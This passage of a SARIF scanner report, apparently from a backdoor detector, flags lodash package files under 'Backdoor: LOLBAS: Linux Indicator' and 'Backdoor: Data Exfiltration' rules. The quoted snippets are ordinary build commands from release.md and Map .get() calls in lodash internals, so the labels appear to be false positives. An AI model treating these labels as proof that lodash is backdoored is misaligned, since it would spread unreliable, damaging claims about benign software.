            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 34,
                  "endLine": 10,
                  "endColumn": 3,
                  "snippet": {
                    "text": "cd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\n",
                    "rendered": {
                      "text": "cd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\n",
                      "markdown": "`cd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n1. Clone two repos\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 82,
                  "endLine": 9,
                  "endColumn": 3,
                  "snippet": {
                    "text": "mkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n",
                    "rendered": {
                      "text": "mkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n",
                      "markdown": "`mkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 84,
                  "endLine": 8,
                  "endColumn": 5,
                  "snippet": {
                    "text": "git clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n",
                    "rendered": {
                      "text": "git clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n",
                      "markdown": "`git clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\ncp LICENSE npm-package/LICENSE\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 40,
                  "endLine": 7,
                  "endColumn": 5,
                  "snippet": {
                    "text": "npm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\n",
                    "rendered": {
                      "text": "npm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\n",
                      "markdown": "`npm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\ncp lodash.js npm-package/lodash.js\ncp dist/lodash.min.js npm-package/lodash.min.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 100,
                  "endLine": 5,
                  "endColumn": 104,
                  "snippet": {
                    "text": "npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                    "rendered": {
                      "text": "npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                      "markdown": "`npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 62,
                  "endLine": 5,
                  "endColumn": 66,
                  "snippet": {
                    "text": "npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                    "rendered": {
                      "text": "npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n",
                      "markdown": "`npm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\nnode ./node_modules/lodash-cli/bin/lodash modularize exports=node -o ./npm-package\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/release.md"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 5,
                  "endLine": 4,
                  "endColumn": 4,
                  "snippet": {
                    "text": "npm run build\nnpm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n",
                    "rendered": {
                      "text": "npm run build\nnpm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n",
                      "markdown": "`npm run build\nnpm run doc\nnpm i\ngit clone --depth=10 --branch=master git@github.com:lodash-archive/lodash-cli.git ./node_modules/lodash-cli\nmkdir -p ./node_modules/lodash-cli/node_modules/lodash; cd $_; cp ../../../../lodash.js ./lodash.js; cp ../../../../package.json ./package.json\ncd ../../; npm i --production; cd ../../\nnode ./node_modules/lodash-cli/bin/lodash core exports=node -o ./npm-package/core.js\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_getData.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 16,
                  "endLine": 12,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @returns {*} Returns the metadata for `func`.\n */\nvar getData = !metaMap ? noop : function(func) {\n  return metaMap.get(func);\n};\n\nmodule.exports = getData;\n",
                    "rendered": {
                      "text": " * @returns {*} Returns the metadata for `func`.\n */\nvar getData = !metaMap ? noop : function(func) {\n  return metaMap.get(func);\n};\n\nmodule.exports = getData;\n",
                      "markdown": "` * @returns {*} Returns the metadata for `func`.\n */\nvar getData = !metaMap ? noop : function(func) {\n  return metaMap.get(func);\n};\n\nmodule.exports = getData;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/memoize.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 18,
                  "endLine": 60,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        cache = memoized.cache;\n\n    if (cache.has(key)) {\n      return cache.get(key);\n    }\n    var result = func.apply(this, args);\n    memoized.cache = cache.set(key, result) || cache;\n",
                    "rendered": {
                      "text": "        cache = memoized.cache;\n\n    if (cache.has(key)) {\n      return cache.get(key);\n    }\n    var result = func.apply(this, args);\n    memoized.cache = cache.set(key, result) || cache;\n",
                      "markdown": "`        cache = memoized.cache;\n\n    if (cache.has(key)) {\n      return cache.get(key);\n    }\n    var result = func.apply(this, args);\n    memoized.cache = cache.set(key, result) || cache;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_baseMergeDeep.js"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n  var objValue = safeGet(object, key),\n      srcValue = safeGet(source, key),\n      stacked = stack.get(srcValue);\n\n  if (stacked) {\n    assignMergeValue(object, key, stacked);\n",
                    "rendered": {
                      "text": "function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n  var objValue = safeGet(object, key),\n      srcValue = safeGet(source, key),\n      stacked = stack.get(srcValue);\n\n  if (stacked) {\n    assignMergeValue(object, key, stacked);\n",
                      "markdown": "`function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n  var objValue = safeGet(object, key),\n      srcValue = safeGet(source, key),\n      stacked = stack.get(srcValue);\n\n  if (stacked) {\n    assignMergeValue(object, key, stacked);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_equalObjects.js"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 24,
                  "endLine": 44,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n  }\n",
                    "rendered": {
                      "text": "  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n  }\n",
                      "markdown": "`  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_equalObjects.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 24,
                  "endLine": 43,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    }\n  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n",
                    "rendered": {
                      "text": "    }\n  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n",
                      "markdown": "`    }\n  }\n  // Check that cyclic values are equal.\n  var objStacked = stack.get(object);\n  var othStacked = stack.get(other);\n  if (objStacked && othStacked) {\n    return objStacked == other && othStacked == object;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_baseClone.js"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 21,
                  "endLine": 134,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  }\n  // Check for circular references and return its corresponding clone.\n  stack || (stack = new Stack);\n  var stacked = stack.get(value);\n  if (stacked) {\n    return stacked;\n  }\n",
                    "rendered": {
                      "text": "  }\n  // Check for circular references and return its corresponding clone.\n  stack || (stack = new Stack);\n  var stacked = stack.get(value);\n  if (stacked) {\n    return stacked;\n  }\n",
                      "markdown": "`  }\n  // Check for circular references and return its corresponding clone.\n  stack || (stack = new Stack);\n  var stacked = stack.get(value);\n  if (stacked) {\n    return stacked;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_equalArrays.js"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 24,
                  "endLine": 32,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n  }\n",
                    "rendered": {
                      "text": "  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n  }\n",
                      "markdown": "`  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_equalArrays.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 24,
                  "endLine": 31,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    return false;\n  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n",
                    "rendered": {
                      "text": "    return false;\n  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n",
                      "markdown": "`    return false;\n  }\n  // Check that cyclic values are equal.\n  var arrStacked = stack.get(array);\n  var othStacked = stack.get(other);\n  if (arrStacked && othStacked) {\n    return arrStacked == other && othStacked == array;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}